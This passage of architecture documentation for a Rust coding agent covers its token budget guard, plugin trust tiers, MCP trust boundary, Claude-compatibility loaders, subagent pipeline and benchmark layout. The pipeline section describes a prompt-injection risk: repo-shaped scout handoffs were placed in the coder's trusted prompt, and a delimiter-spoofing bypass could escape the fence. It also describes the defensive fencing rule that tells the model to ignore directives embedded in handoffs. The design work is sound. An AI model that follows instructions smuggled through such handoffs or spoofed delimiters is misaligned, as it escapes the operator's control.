 drift early. Both hooks are in-process Rust handlers when compiled in.

Stratum also coordinates with the budget guard (`kf-budget-core`, Workorder 8.6,
ADR-051): when the budget slices a tool result, a registered Stratum listener
compresses the sliced display so the model sees a single coordinated
post-compression size, and the Stratum session mode auto-escalates `Lite →
Full` when the budget is `Approaching`. The coordination is a sync
registered-listener dispatch (not the async `EventBus`) because the slice path
is itself sync. The listener registry is keyed by session_id (WO 38.8) so
concurrent executors (personas, subagents, `/plugins` reload) dispatch slices
to their own listeners — the old append-only global `Vec` let session #1's
listener shadow session #2's. `run_session.rs` attaches the per-session
`SessionStores` to the executor via `attach_session_stores`, which wires
the budget guard, the stratum slice listener, and the budget hooks into the
production session path (WO 38.8 — previously `set_budget_stores` /
`set_stratum_store` had zero production callers and `apply_budget_slice` was
dead code on the `None/None` path).

---

## Token budget (kf-budget-core)

The budget guard is the **output-side** context cost system. It tracks token spend
against a configurable ceiling (default 200K) and intervenes when the budget is
approached or exceeded:

| State | Action |
|---|---|
| `Under` | Allow |
| `Approaching` (≥80% of ceiling) | Warn; auto-escalate Stratum `Lite → Full` (Workorder 8.6) |
| `Over` | Slice the largest recent tool output, or compact if no single slice fits |

The orchestrator (`SlicingOrchestrator`) classifies tool outputs, slices
oversized ones with head/tail markers, and offloads the full content to a store.
Cost reporting tracks per-turn usage. Usage capture is provider-correct as of
WO 38.5: the Anthropic family reads usage from `message_start`/`message_delta`
(the real wire shape) instead of the never-sent `message_stop`; the OpenAI-compat
adapter sends `stream_options: {include_usage}` and merges the post-finish usage
frame. `TokenUsage` carries `cache_write_tokens` billed at the write rate. The
 budget guard ships as a compiled-in module
 (when the `budget` feature is on, ADR-047). WO 38.8 wired the budget guard
 into the production session path via `attach_session_stores` (see below);
 there is no standalone `kf-budget` binary — the feature-off path registers
 no budget tools/hooks.

The 4 in-process hooks receive full `HookContext` with real tool result content
 and compact metadata — the lossy canned-JSON shim that existed when the budget
 guard ran as a shell plugin is eliminated (ADR-047). The hooks observe and report budget
 usage; active slicing of tool results before they enter the conversation shipped
 in Workorder 7.1 (`check_and_slice` in `src/session/budget.rs`). The budget guard
 is wired into the production session path via `attach_session_stores` (WO 38.8):
 `run_session.rs` builds `SessionStores` and passes them to `run_tui` /
 `run_line_mode`, which call `executor.attach_session_stores(stores)` after
 `set_session_id`. This runs `init_from_config`, registers the budget hooks,
 and registers the Stratum slice-compression listener keyed by session_id.
 The executor's `Drop` impl clears the session's listeners on teardown so a
 dropped session doesn't leak into the process-global registry.

`PreCompactHook` (in `src/session/budget.rs`) escalates the Stratum session
mode to `Full` when a `pre-compact` fires under budget pressure, so the next
tool-result cycle uses more aggressive compression.

---

## Plugin system

Plugins are manifest-based and dynamically loaded at runtime from the
filesystem. The plugin SDK (`kf-plugin-host::sdk`, folded from
`kf-plugin-sdk` in WO 47.4) and host (`kf-plugin-host`)
are compiled into the binary; plugin *functionality* arrives via one of two
dispatch paths (ADR-050):

1. **Compiled-in** (feature on): tools register as direct Rust calls in
   `main/mod.rs`; hooks register as `InProcessHook` handlers in the executor.
   The shell plugin dir is skipped by the loader, so only the in-process
   version registers — no duplicate tool registrations.
2. **Feature-off** (no shell fallback): when a folded plugin's feature is off,
   its tools and hooks are not registered. The former shell-plugin trees that
   provided graceful degradation were deleted in WO 29.9 — building without a
   feature means the plugin's capabilities are absent, not shell-backed.

The folded plugins (Stratum, Budget, kf-plugin) use this two-path
dispatch. A single toggle — `enabled_plugins` in `ToolConfig` — controls both
paths: a folded plugin name enables the compiled-in path (feature on) or the
shell path (feature off). As of WO 15.7 (item 5.1), the runtime toggle also
gates the compiled-in path: when a folded plugin name is absent from
`enabled_plugins`, its tools and in-process hooks are not registered even
when the compile-time feature is on. So `/plugins disable stratum` removes
"stratum" from `enabled_plugins` and the Stratum tools/hooks stay live only
on the next `kf-code run` that re-registers them. `plugin_sources` is only
needed for external/shell plugins. The `kf-plugin` self-plugin is folded
behind the `kf-plugin-tools` feature (WO 29.1): `doctor`, `health`,
`tools`, `verify`, and `audit_verify` run as native Rust calls; `verify`
runs the orchestrator crate's security emitter over the working tree and
`audit_verify` walks the WO 29.4 hash chain over an audit JSONL file
(both WO 35.6); `verify_workspace` still reports not-implemented — the
crate reducer shipped in WO 37.2 (ADR-076), but this tool is not yet
wired to it. The orchestrator's `ModelClient` has a production
impl (`session::executor_adapter::ExecutorAdapter`, WO 35.6 / ADR-075),
though the verify commands are deterministic and do not call it. The
external linters themselves (ESLint, TypeScript,
Ruff, Pyright, Bandit) stay external subprocesses under both paths
(ADR-050). The TS tree (`npm/kf-plugin/`) and shell-plugin tree
(`plugins/kf-plugin/`) were deleted in WO 29.9 — the Rust path is the sole
implementation.

`/plugins list` shows the source (`compiled-in` / `external` /
`external (feature off)`) and feature gate for each workspace plugin source.

### Manifest format (`kf-code.toml`)

```toml
name = "stratum"
version = "0.2.0"
description = "Context compression pipeline"
api_version = "v1"
trust = "shell"

[[capabilities]]
type = "tool"
name = "stratum_run"
description = "Run the compression pipeline"
schema = { ... }
command = "tools/run.sh"

[[capabilities]]
type = "skill"
trigger = "/stratum"
prompt = "..."

[[capabilities]]
type = "hook"
event = "session-start"
command = "hooks/session-start.sh"

[[capabilities]]
type = "verifier"
name = "stratum-config"
priority = 5
```

The host validates every manifest with `PluginManifest::validate()`
before applying the trust policy. The validator collects every rule
violation into a `Vec<ValidationError>` and surfaces them as load
warnings (no rejection — the user sees all issues at once). Rules:
kebab-case `name`; valid semver `version`; `api_version` is `v1`;
capability-specific constraints (tool/hook `command` must be a
relative path, skill `trigger` must start with `/`, hook `event`
must be in the canonical set `session-start` / `pre-turn` /
`post-turn` / `pre-tool-bash` / `post-tool-bash` /
`post-tool-write_file` / `pre-compact` / `post-compact`, verifier
`name` non-empty, tool `schema` is a JSON
object with a valid optional `type` field); and no duplicate skill
triggers / tool names / verifier names within a single manifest.

### Trust tiers

`read-only` < `shell` < `network` < `unsafe`. The host caps plugins at
`max_plugin_trust` (config: default `shell`). Over-tier plugins are rejected or
downgraded. Optional minisign detached-signature verification (`.kf-code.sig`)
covers the manifest only (`kf-code.toml`); the content-hash consent ledger
(`plugin_consent_ledger`, default on) covers the manifest + command scripts
and layers on top of signature verification (WO 45.61 / WO 46.13).

### Capability kinds

| Kind | What it does |
|---|---|
| `skill` | A slash command with a templated prompt (model invokes it; the prompt is injected) |
| `tool` | A named tool with a JSON Schema, invoked by the model like a built-in tool (shell command) |
| `hook` | A lifecycle hook script fired on an event |
| `verifier` | A deterministic post-execution check with priority |

### The 3 built-in plugins

| Plugin | Trust | Skills | Tools | Hooks | Source |
|---|---|---|---|---|---|
| `kf-plugin` | shell | `/kf-code` | 6 | 0 | Compiled-in (`kf-plugin-tools` feature) — `verify` runs the security emitter (WO 35.6); `verify_workspace` reports not-implemented (reducer pending wiring) |
| `stratum` | shell | `/stratum` | 5 | 2 | Compiled-in (`stratum` feature) — no shell manifest |
| `kf-budget` | shell | `/budget` | 7 | 4 | Compiled-in (`budget` feature) — no shell manifest |

Runtime toggles: `enabled_plugins` (Vec) and `plugin_sources` (HashMap) in
`ToolConfig`. The `/plugins` TUI command set: `list`, `enable`, `disable`,
`toggle`, `reload`, `trust`, `approve`, `sources`, `add`, `remove`, `setup`
(`approve <n>` records consent-ledger approval for a pending bundle).

### Tool integration strategy: MCP-first

KirkForge has two mechanisms for adding tools:

#### Bespoke plugin system (frozen for new tools)

The manifest-based plugin system (`kf-code.toml`, trust tiers, minisign
signatures, hook veto, verifier integration) is the original extensibility
path. It is **frozen for new tool integrations** — existing plugins continue
to work and are maintained, but new tools should not be added as bespoke
plugins. This system is still the right choice for capabilities that require
deep lifecycle integration (hooks, verifiers, skills, trust gating).

#### MCP (primary path for new tool integrations)

The MCP client (`src/session/mcp_client/`) speaks the Model Context Protocol
over stdio and streamable-HTTP transports. Transports implement the private
`McpTransport` trait (framing/liveness primitives); all MCP operations
(tools/resources/prompts) are shared wrappers in `McpClient`, so a future
transport is a single trait impl (WO 47.7). It supports `tools/list` and
`tools/call` — the subset needed to expose any MCP-compatible server as
tools in the agent loop. Tools are prefixed `mcp/<server>/<tool>` and are
resolved alongside built-in tools in `CompositeToolset` (priority: builtin >
MCP > plugin).

MCP is the **default choice** for new tool integrations because it is a
standard protocol: any MCP server works without custom plugin manifests,
trust-tier wiring, or minisign signatures. Servers that advertise
unsupported capabilities (`resources`, `prompts`, `sampling`, `roots`) are
logged as warnings at startup.

##### MCP trust boundary and local sandbox policy

MCP tool calls execute on a **remote server** over a transport (stdio/HTTP).
The local wrapper (`McpToolWrapper`, `src/session/mcp_tools.rs`) cannot
sandbox code that runs elsewhere, so it applies no `PathGuard` — the
operator's choice to list a server in `config.tools.mcp_servers` (and, for
project-local `.mcp.json`, the first-load approval gate) **is** the trust
grant. This is distinct from the resource tools (`mcp_resource` /
`mcp_prompt`), which validate URIs against the workspace
(`validate_mcp_uri`, `src/session/mcp_resource_tools.rs`).

The one local-side gate on the generic tool-call path is **argument
scrubbing**: before forwarding `args` to `manager.call_tool`, every string
value in the args JSON is checked against the session `DenyList` (the same
list that gates `web_fetch` and bash). A denied URL embedded in the args
(e.g. a cloud metadata endpoint) is blocked at the boundary with
`AccessDenied`, before it reaches the remote server. This mirrors
`web_fetch`'s `deny_list.is_url_denied` check. Path-pattern deny entries are
not applied to MCP args (the remote server's filesystem is not the local
one); only URL-prefix entries are scanned.

**Result trust is the operator's responsibility.** A compromised server's
response returns to the model with no local content gate. If the model then
writes that content to a file, `PathGuard` gates the write — but the MCP
call itself has no content gate. This is inherent to the remote-execution
model and is not fixable locally. The parallel sampling trust model
(server-initiated model calls) is documented in ADR-072.

MCP is **not** unified under `SandboxPolicy` (the plugin trust-tier type).
MCP servers are trusted by configuration, not by capability manifest, so a
trust-tier check on `McpToolWrapper::run` would not match the trust model.

#### When to use which

| Need | Use |
|---|---|
| Expose a new tool to the agent | MCP server (stdio or HTTP) |
| Lifecycle hooks (pre/post-tool, session events) | Bespoke plugin |
| Verification checks in the bus | Bespoke plugin |
| Slash-command skills with templated prompts | Bespoke plugin |
| Trust-tier gating on untrusted code | Bespoke plugin |

Both systems coexist. MCP does not replace hooks, verifiers, or skills —
it replaces the `tool` capability kind for new tools. Existing bespoke
plugins that expose tools continue to work unchanged.

### Claude compatibility layer (WO 39.2 / WO 39.3 / WO 45.31)

kf-code reads four Claude-ecosystem surfaces so a Claude plugin's skills,
commands, agents, and `.mcp.json` dropped into a project are picked up on
the next start. This is an explicit product promise (Claude compat
direction), not an accident — the loaders ship and are documented here.

**The four loaders:**

- **Skills** (`.claude/skills/*/SKILL.md` → `skills.rs:126,159`): a skill
  without a `trigger` field was historically unreachable (dispatch is
  `get_by_trigger` only). `parse_frontmatter` derives `/<name>` when
  `trigger` is empty, so every stock Claude skill becomes an invocable
  slash command. Skills register in `SkillRegistry` and are dispatched by
  `/<trigger>` in the agent loop.
- **Commands** (`.claude/commands/**/*.md` + optional `~/.claude/commands`
  → `skills.rs:160,406`): files register as skills. The filename stem is
  the trigger (`review.md` → `/review`); `$ARGUMENTS` and `$1`..`$9`
  placeholders are rewritten to `{{args}}` for the prompt renderer. An
  optional YAML frontmatter block is parsed for `name`/`description`/
  `model`; absent frontmatter falls back to the stem.
- **Agents** (`.claude/agents/*.md` → `agents.rs:331`): Claude agent files
  are markdown with YAML-like frontmatter (`name`, `description`, `tools`,
  `model`) and a body that is the agent's system prompt. An unknown
  `task`-tool persona name is looked up in the agent registry before
  falling back to the hardcoded personas (`explore`, `plan`, `coder`). A
  hit restricts the toolset to the agent's `tools` frontmatter (translated
  through the alias table below) and prepends the agent's system prompt.
  The `model` frontmatter field overrides the model for that agent's
  calls (WO 45.31 wired this — resolution order: per-call `task` arg →
  agent `model` → `subagent_provider.model` → parent model).

  Minimal example — drop this at `.claude/agents/code-reviewer.md` in
  the project root, then invoke with `task` tool's `persona="code-reviewer"`
  (the `task` tool description lists discovered agent names so the model
  knows which persona values are valid):

  ```markdown
  ---
  name: code-reviewer
  description: Reviews code for bugs and style
  tools: Read, Grep, Glob, Bash
  model: claude-sonnet-4
  ---
  You are a senior code reviewer. Read the diff, flag bugs, style
  issues, and security concerns. Be concise; cite file:line.
  ```

  Only `name` is required; `description`, `tools`, and `model` are
  optional. `tools` is a comma- or space-separated list of Claude tool
  names (translated through the alias table below). The body after the
  closing `---` is the agent's system prompt. Files without valid
  frontmatter are skipped with a `tracing::warn!` (a bad agent file does
  not break the session).
- **`.mcp.json`** (project-root `.mcp.json` → `mcp_project.rs:52`): a
  project-root file with an `mcpServers` object is parsed into
  `McpServerConfig` entries (`command`/`args`/`env` → stdio;
  `url`/`token` → http) and merged into the MCP config before
  `McpClientManager::new`.

**Tool-name alias table** (`agents.rs:53-67`, `CLAUDE_TOOL_ALIASES`):
Claude tool names in agent `tools` frontmatter and command allowed-tools
lists are mapped to kf-code native tool names before the allowlist filter:

| Claude name | Native tool |
|---|---|
| `Read` | `read_file` |
| `Write` | `write_file` |
| `Edit` / `MultiEdit` | `edit_file` |
| `Bash` | `bash` |
| `Glob` | `glob` |
| `Grep` | `grep` |
| `WebFetch` | `web_fetch` |
| `WebSearch` | `web_search` |
| `NotebookEdit` | `notebook_edit` |
| `TodoWrite` | `todo` |
| `Task` / `Agent` | `task` |

Unknown names pass through unchanged (forward-compat). A system-prompt
suffix (`claude_alias_suffix`) appends the mapping so the model's prose
references to "use Read" map to the native tool name.

**Trust gates:**

- **Agents** are gated by `plugin_trust_workspace` (`tools` config flag).
  The workspace `.claude/agents/` directory is model-writable in-session,
  so a dropped agent file can widen a subagent's toolset — the same threat
  model as workspace plugins (ADR-057). When `plugin_trust_workspace =
  false` (the default), workspace agents are refused with a `tracing::warn!`;
  the operator opts in via the config flag. Agents under the canonical data
  directory are always trusted.
- **`.mcp.json`** is gated by `tools.load_project_mcp_json` (config flag,
  default on) plus a first-load-per-project approval prompt. A cloned
  repo's `.mcp.json` is attacker-controllable spawn config, so the approval
  is persisted in the data dir (`approved_mcp_projects.json`) and only
  approved projects load silently on subsequent launches. The approval
  stores a sha256 content hash alongside the project path (WO 42.5): a
  modified `.mcp.json` under an already-approved path re-gates, closing
  the modified-after-approval attack vector. Legacy approvals without a
  hash trigger re-approval (safe default).

  The first-contact gate is a real interactive yes/no prompt (WO 45.31):
  `prompt_mcp_approval` in `run_session.rs` prints the server list to
  stderr and reads one line from stdin — `y`/`yes` admits, anything else
  (including EOF) denies. The prompt runs once at session setup, before
  the TUI or line-mode loop starts, so there is no competing stdin
  reader. The decision logic is pure and testable
  (`decide_unapproved_mcp` in `mcp_project.rs`): precedence is env
  override > interactive prompt > non-interactive drop. An env override
  `KF_MCP_AUTO_TRUST_PROJECT=<path>` is the CI/scripted escape hatch: it
  pre-trusts a named project (path-canonicalized) without a prompt, which
  is a real trust decision (the operator names the exact project, not a
  blanket trust). Non-interactive without the override still drops —
  never auto-approve spawned subprocesses from a script.

**Honest limitations (deferred):**

- **Hooks phase 3** (WO 39.4): the Claude hook stdin-JSON contract and
  generic pre/post-tool events are not yet implemented. This is the
  lowest-frequency artifact class and is tracked in
  [39.4](archive/workorders/39.4-claude-compat-phase3.md). Skills, commands,
  agents, and `.mcp.json` all ship; hooks do not.

---

## Specialized runtimes

### Workflow engine

`kf-workflow` is a programmable JSON workflow engine. Workflows are DAGs
of persona-driven steps (`explore`, `plan`, `coder`) with optional critique
passes. Three built-in templates ship: `bugfix`, `feature`, `refactor`.
Workflows reuse the `task` tool's in-process spawner, so they run as orchestrated
subagent personas within a single session. Workflows are invoked two ways: the
TUI `/workflow run` slash command, and the `workflow_run` tool (WO 9.1) which
lets the agent loop and bench harness run a named template via a tool call.
Agent steps cancel with the workflow (WO 48.32): `bridged_task_cancel`
(`src/tools/workflow.rs`) cascades the runner's `CancellationToken` into the
agent step's `TaskRequest` cancel pair (flag + token + Notify-done watcher)
via the same `cascade_parent_cancel` bridge as the foreground `task` tool —
Esc or a job timeout now stops the subagent's LLM loop, not just its
bash/tool steps.

### Scout→coder→reviewer pipeline (WO 32.5; pipeline semantics WO 35.1; WO 41.1 rename + patch application)

`PipelineOrchestrator` (`src/session/parallel_orchestrator.rs`; renamed from
`ParallelOrchestrator` in WO 41.1 — the pipeline is sequential, the old
name misled) runs three subagents as a real pipeline, not a fan-out: the
Scout (`explore` persona, read-only) completes first and its context
summary is injected into the Coder's prompt; the Coder (`coder` persona,
write, own worktree when `artifact_policy` is `patch_only`/`auto_apply`
per WO 35.2 / WO 45.37) returns a
change summary plus an appliable diff patch, which is injected into the
Reviewer's prompt; the Reviewer (`plan` persona, read-only) critiques the
Coder's actual changes (not the task blurb) and ends with "## Review
Complete". The extracted patch is exposed on `PipelineResult.coder_patch`
(renamed from `ParallelResult` in WO 41.1). WO 41.1 collapsed the two
public entry points (`run_parallel` / `run_sequential`) into a single
`run_pipeline` — both were the same pipeline since WO 35.1; the
`/workflow run <name> --parallel` flag now means "worktree isolation"
(not "concurrent execution") and selects coder FS isolation, not
ordering. Each role registers a `TaskManager` entry (internal cancel
bookkeeping, not rendered by `/jobs`) with the WO 35.3 cancel pair (flag
+ token) and its owner id riding on the role's `TaskBrief`, so
`PipelineOrchestrator::cancel_all()` stops in-flight roles cooperatively
(each runs cleanup, captures any worktree patch, and returns) and
cancel-by-owner still reaches role-spawned bash jobs. Since WO 36.5 the
orchestrator holds one injectable `Arc<dyn ModelClient>` — production
uses the `ExecutorAdapter` (below), so roles execute through the same
seam as kf-orchestrator's delegation modes and inherit WO 32.4
landlock/CWD confinement and WO 30.6 approval forwarding. The brief's
persona marks it caller-framed: the pipeline's role prompt is the
complete prompt (one wrapper, never two — the WO 35.1 rule).

WO 41.1 closed the patch-discard hole: the Coder's captured patch was
returned in `coder_patch` but no consumer read it — the parent workspace
stayed unchanged while the TUI reported success. The pipeline consumer
(`handle_run` in `src/tui/commands/workflow.rs`) now reads
`result.coder_patch` after the Reviewer phase. When
`session.auto_apply_patch` is true, `apply_patch_to_parent` runs
`git apply -` in the parent CWD (stdin-piped patch, 30s timeout,
`kill_on_drop`); on conflict/dirty-tree the git stderr is surfaced as
an error event (success=false), never silent loss. The default
(`auto_apply_patch=false`) surfaces the patch text and a `git apply`
hint in the TUI summary — the user applies it explicitly.

WO 38.4 (orchestration correctness, adversarial review) closed four
holes in this pipeline. (1) `/workflow cancel` on the parallel path is
real: the TUI stores the live `Arc<PipelineOrchestrator>` in
`GenerationState.workflow_orchestrator` at `handle_run` time, and
`handle_cancel` calls `cancel_all()` on it — previously a lying no-op
(the shared flag was only read by the sequential DAG runner and
`cancel_all` had zero production callers). `cancel_all` also arms a
pipeline-level `Arc<AtomicBool>` that `run_pipeline` checks before each
phase, closing the window where a cancel during scout could not reach
the not-yet-registered reviewer handle. A prior-phase *error*
short-circuits the same way: a failed scout is never stringified into
the coder's context and a dead provider does not burn two more full
sessions — `PipelineResult.aborted` names the reason and the summary
renders `ABORTED` (no lying success UI). (2) Identities mint from the
process-global `NEXT_TASK_ID` counter (WO 37.1), not `pid+millis`: two
`task` calls in one assistant message no longer collide on the temp dir
(two subagents sharing one `conversation.ndjson` — first finisher
deleting it under the other) or the worktree path (stale recovery
force-removing a LIVE sibling worktree); a pre-existing temp dir is a
hard error, not silent sharing. (3) Handoffs are bounded (8KB char
limit) and fenced as untrusted data (`<<<BEGIN UNTRUSTED HANDOFF>>>`
delimiters + an instruction to ignore embedded directives) — a scout
summary is model output shaped by repo file contents, so injecting it
raw into the coder's prompt was trusted-position prompt injection
(strictly worse than tool-result injection). WO 41.2 closed the
delimiter-spoof hole: `fence_handoff` neutralizes any literal
begin/end delimiter embedded in the body (replaces `<<<`/`>>>` with
`[[`/`]]`) before wrapping, so a malicious handoff cannot close the
fence early and smuggle trusted-position text after it.
`extract_patch` splits at
the LAST `SUBAGENT_PATCH_MARKER` so a marker the model echoes earlier
in its text cannot shadow the real appended patch. (4) Cancel is
transitive to nested subagents: `TaskMetadata.parent_task_id` records
the spawning task, and `cascade_parent_cancel` links the parent
executor's live cancel token to the nested task's cancel pair (flag +
token) — an outer cancel fires the child's pair and the nested `run_task`
exits cooperatively. Both background and foreground nested tasks derive
their cancel from `ctx.token`. (The WO 38.4 Esc-then-input window fix
was assigned to the WO 38.5 adapter agent and landed there in
`src/session/executor/loop_.rs` — it is not part of this branch.)

### Orchestrator ModelClient wiring (WO 35.6 / 36.5, ADR-075)

`kf-orchestrator`'s `ModelClient` trait has a production implementation in
the binary: `session::executor_adapter::ExecutorAdapter`. Each
`TaskBrief` is mapped onto an isolated subagent session through
`InProcessTaskSpawner::run_task_detailed` (the `task` tool's path, plus
summed `CostStats` usage and a derived finish reason): `content` is the
final assistant message, `format` echoes the brief's template, and
persona selection maps `task-decompose` → `plan` (read-only) and the
three writer modes → `coder` (ADR-075 documents the flattening and the
rejected session-variant). Since WO 36.5 the adapter is the pipeline's
production executor: `PipelineOrchestrator` roles run as `TaskBrief`s
through it. A brief carrying a `persona` is caller-framed (the pipeline
owns the complete role prompt); delegation-mode briefs get the adapter's
mode frame. Execution hints (`persona`, `max_turns`, `owner`, `cancel`)
are serde-skipped brief fields consumed only by the adapter; the
WO 35.2 worktree patch keeps traveling inside `Emission.content` via the
subagent patch marker. `Orchestrator::delegate` is drivable end-to-end
with this adapter (wiremock-tested); reimplementing the pipeline on
`kf-orchestrator::Orchestrator` remains a follow-up decision.

### Reducer (WO 37.2, ADR-076)

Every `Orchestrator::delegate` call folds its verification state into the
`packet` on the returned `DelegationResult` (`kf_orchestrator::reducer`):
changes from the written-file signals, security from scanning those files
(resolved against the delegation cwd), lint/types/graph at default (no
in-crate producers — external linters stay external per ADR-050), and the
overall verdict from the ADR-076 fold (Fail ← critical findings or error
categories; Warn ← non-error findings; Pass ← all clean, including the
empty case; the reducer never emits `Unknown`). The correction loop feeds
this packet into `decide_correction`, so clean delegations accept on turn
0 instead of cycling corrections until exhaustion, and
`execute_decomposition` subtask verdicts become real. Deterministic
lint/types/graph emitters remain unported; wiring the binary's
 `plugin_verify_workspace` tool to the crate reducer is follow-up work.

---

## Cross-session state management (WO 43.10)

KirkForge's state is split into **durable** (survives session death, on
disk) and **ephemeral** (process-bound, dies with the session). The full
field-classification table lives in [`state.md`](../state.md) under
"Cross-session state preservation policy"; this section summarizes the
architecture.

### Durable stores

All durable state lives under `data_dir()` (`~/.local/share/kf-code/` on
Linux, resolved via `directories::ProjectDirs`; overridable via
`KF_CODE_DATA_DIR`):

- `sessions/<id>.conv.ndjson` — conversation transcript (append-only
  NDJSON with checkpoint rotation; `ConversationLog::Drop` flushes).
- `sessions/.index.ndjson` — session index cache (id, path, message
  count, started_at; rebuilt if missing).
- `undo/<session_id>/<n>.snap` — per-edit undo snapshots.
- `carryover.json` — carryover profile (model, persona, cost, flags);
  saved in TUI `teardown()`.
- `tasks/<id>.json` — subagent task summaries (WO 41.5 Phase 1;
  `PersistedTask` serde struct).
- `jobs/<id>/` — scheduled job store (`job.json` + `runs/` per job;
  atomic write + rename). Job ids are minted by reservation
  (`generate_job_id`, WO 48.36): the id directory is claimed with an
  atomic `create_dir` (`AlreadyExists` = taken, retry), so two concurrent
  callers can never mint the same id and `JobStore::save` reuses the
  reserved dir.
- `jobs/bg-exits.ndjson` — background bash exit summary (WO 43.10);
  one NDJSON line per still-Running job appended on session teardown so
  `--resume` can report "these jobs died with the session".
- `logs/usage.jsonl` — token usage log (budget guard writes; `kf-code
  metrics` reads).
- `audit.jsonl` — tamper-evident audit log (hash chain; hook/verifier
  events).

### Ephemeral stores (intentionally process-bound)

- `SLICED_LISTENERS` (`session/budget.rs`) — session-keyed budget
  listener HashMap; cleared in `Executor::Drop` (WO 38.8).
- `GLOBAL_REGISTRY` (`session/bash_jobs.rs`) — background bash job
  registry + child process handles; children use `kill_on_drop`, and an
  exit summary is persisted before the process dies (above).
- Cancel tokens (`tokio_util::sync::CancellationToken`) — turn/task/
  workflow-scoped; dropped with the owning scope.
- `ReadGate` (`shared/access.rs`) — per-session "files read" set for
  the edit-before-read policy; lives on `Executor`.
- `VerifierSlots` (`session/verifier/slots.rs`) — per-executor verifier
  instances; lives on `VerifierHandler`.

### Blocked on WO 41.5 Phase 3

The full `AgentRun` object (transcript, artifacts, verifier results) is
the convergence point where `/jobs`, replay, metrics, correction, and
orchestration all operate on the same persistent object. Phase 1
(summaries) shipped; Phase 3 is deferred.

---

## Benchmarks (KIRK-BENCH)

The benchmark system measures agent capability on coding tasks. The spec
defines eight categories (A–H), 40 numbered tasks, one universal scoring
format, 10 hero benchmarks, and one signature challenge — the **Token Budget
Challenge** (WO 14.7, ADR-0066).

### Categories

- **A — Repository Understanding** (5 tasks): Find Dead Code, Dependency
  Graph Accuracy, Call Graph Generation, Explain Module, Cross-Repository
  Search. *Metrics: precision, false positives, runtime.*
- **B — Refactoring** (5 tasks): Rename Public API, Extract Trait, Extract
  Module, Split Giant File, Remove Duplication.
- **C — Bug Fixes** (6 tasks): Fix Compilation Error, Fix Clippy Lints, Fix
  Unit Test, Fix Integration Test, Fix Panic, Resolve Borrow Checker Error.
- **D — New Features** (5 tasks): Add CLI Flag, Add REST Endpoint, Add Config
  Option, Implement Missing Trait, Implement TODO Stub.
- **E — Verification** (5 tasks): Build Verification, Formatter Verification,
  Lint Verification, Test Verification, Self Repair. *These are the
  differentiators.*
- **F — Context Intelligence** (4 tasks): Large Repository Navigation, Semantic
  Retrieval, Context Compression, Budget Enforcement.
- **G — Real Engineering** (5 tasks): Multi-file Feature, Large Refactor,
  Merge Conflict Resolution, PR Review, Regression Detection.
- **H — Cost** (5 tasks): Token Efficiency, Dollar Cost, Time, Retry Count,
  Human Intervention.

### Universal scoring

Every benchmark emits the same metrics block:

```
Benchmark:          Rename Public API
Success:            PASS
Compilation:        PASS
Tests:              PASS
Lint:               PASS
Verification:       PASS
Retries:            1
Elapsed:            19.4 s
Input Tokens:       8,412
Output Tokens:      1,153
Compression Ratio:  63%
Budget Violations:  0
Provider:           GPT-5
Cost:               $0.12
```

### Hero benchmarks

The 10 hero benchmarks are the public scoreboard:

1. Fix failing Rust build
2. Rename API across workspace
3. Implement missing feature
4. Resolve merge conflicts
5. Refactor 100-file workspace
6. Explain unfamiliar codebase
7. Reduce token usage on a large repository
8. Review a pull request and identify defects
9. Recover automatically from a failed verification step
10. Complete an end-to-end feature (implementation, tests, docs, verification)

### Task TOML format

Each task file in `benches/tasks/` is a TOML file:

```toml
name = "fix_clippy_naming"
difficulty = "easy"
requires_model = false    # true = skipped by bench verify-only

[setup]
"Cargo.toml" = """..."""

[verify]
type = "command_exits_zero"
command = "grep -q 'pub fn first' src/lib.rs"
```

The `requires_model` field is optional (defaults to false). A `category`
field (A–H, matching the spec categories) is accepted by the loader but
no shipped task sets it today; tasks without one are reported under
"Uncategorised".

### Implemented task mapping (30 tasks)

30 implemented tasks cover 18 of the 40 spec slots. 10 hero benchmarks
cross-check the highest-value categories. 1 task (`use_draw_render`) was
removed when the draw plugin was deleted; it is no longer in the task set.

| Existing task | Spec task(s) | Category | Coverage |
|---|---|---|---|
| `add_cli_flag.toml` | 17 Add CLI Flag | D | full |
| `add_doc_comment.toml` | 21 Implement TODO Stub | D | partial |
| `add_enum_variant.toml` | 17 Add CLI Flag | D | partial |
| `add_error_handling.toml` | 15 Fix Panic | C | partial |
| `add_error_variant.toml` | 19 Add Config Option | D | partial |
| `add_struct_field.toml` | 19 Add Config Option | D | partial |
| `add_test_for_function.toml` | 25 Test Verification | E | partial |
| `add_test_module.toml` | 25 Test Verification | E | partial |
| `add_adr.toml` | 21 Implement TODO Stub | D | partial |
| `debug_log_trace.toml` | 15 Fix Panic | C | full |
| `extract_module.toml` | 8 Extract Module | B | full |
| `extract_trait.toml` | 7 Extract Trait | B | full |
| `fix_borrow_error.toml` | 16 Resolve Borrow Checker Error | C | full |
| `fix_clippy_naming.toml` | 12 Fix Clippy Lints | C | full |
| `fix_clippy_warning.toml` | 12 Fix Clippy Lints | C | full |
| `fix_failing_test.toml` | 13 Fix Unit Test | C | full |
| `fix_lifetime_error.toml` | 16 Resolve Borrow Checker Error | C | partial |
| `inline_function.toml` | 10 Remove Duplication | B | partial |
| `multi_file_pattern.toml` | 31 Multi-file Feature | G | full |
| `pr_review.toml` | 34 PR Review | G | full |
| `refactor_extract_function.toml` | 10 Remove Duplication | B | full |
| `refactor_trait_extraction_multi.toml` | 7 Extract Trait | B | full |
| `rename_function.toml` | 6 Rename Public API | B | full |
| `rename_module.toml` | 6 Rename Public API | B | partial |
| `test_fix_cycle.toml` | 26 Self Repair | E | full |
| `use_budget_check.toml` | 30 Budget Enforcement | F | partial |
| `use_lsp_query.toml` | 28 Semantic Retrieval | F | partial |
| `use_stratum_compress.toml` | 29 Context Compression | F | full |
| `use_workflow_run.toml` | 31 Multi-file Feature | G | partial |
| `token_budget_challenge.toml` | 30 Budget Enforcement | F | full (signature) |

### Planned tasks (honest deferral, triaged in ADR-077)

19 spec tasks are not yet implemented. ADR-077 triaged each row (plus the 3
unmapped tasks below) into **implement** (4 — deterministic verify, cheap),
**deferred** (12 — real but blocked on a concrete missing capability), and
**dropped** (6 — no longer a differentiating capability). The Triage column
below carries the verdict; deferrals point at ADR-077 for the named blocker.

| Spec task | Category | Exercises | Triage |
|---|---|---|---|
| 1 Find Dead Code | A | tree-sitter symbol graph + unreferenced-symbol query | deferred → ADR-077 |
| 2 Dependency Graph Accuracy | A | crate-level dep graph generation | deferred → ADR-077 |
| 3 Call Graph Generation | A | per-symbol call graph | deferred → ADR-077 |
| 4 Explain Module | A | module summarisation without hallucination | deferred → ADR-077 |
| 5 Cross-Repository Search | A | trait-impl search across workspace | deferred → ADR-077 |
